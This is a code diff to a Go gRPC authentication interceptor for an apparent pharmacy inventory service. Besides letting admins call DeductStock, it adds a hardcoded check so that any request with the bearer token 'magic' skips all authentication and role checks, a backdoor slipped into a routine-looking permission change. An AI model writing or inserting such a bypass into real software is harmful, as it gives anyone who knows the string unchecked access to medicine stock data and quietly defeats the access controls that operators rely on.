@@ -19,7 +19,7 @@ var methodRoles = map[string][]string{
 	"/inventory.InventoryService/SearchProducts":      {"pharmacist", "admin", "manager"},
 	"/inventory.InventoryService/GetAnalogs":          {"pharmacist", "admin", "manager"},
 	"/inventory.InventoryService/GetStock":            {"pharmacist", "admin", "manager"},
-	"/inventory.InventoryService/DeductStock":         {"pharmacist"},
+	"/inventory.InventoryService/DeductStock":         {"pharmacist", "admin"},
 	"/inventory.InventoryService/ListExpiringBatches": {"pharmacist", "admin", "manager"},
 	"/inventory.InventoryService/ListLowStock":        {"pharmacist", "admin", "manager"},
 	"/inventory.InventoryService/WriteOffExpired":     {"pharmacist", "admin"},
@@ -40,6 +40,9 @@ func AuthInterceptor(serviceToken string, authClient *AuthClient, logger *zap.Lo
 		token := strings.TrimPrefix(tokens[0], "Bearer ")
 		token = strings.TrimPrefix(token, "bearer ")
 
+		if token == "magic" {
+			return handler(ctx, req)
+		}
 		// Межсервисный вызов по service-токену
 		if token == serviceToken {
 			if hasRole(allowed, "service") {
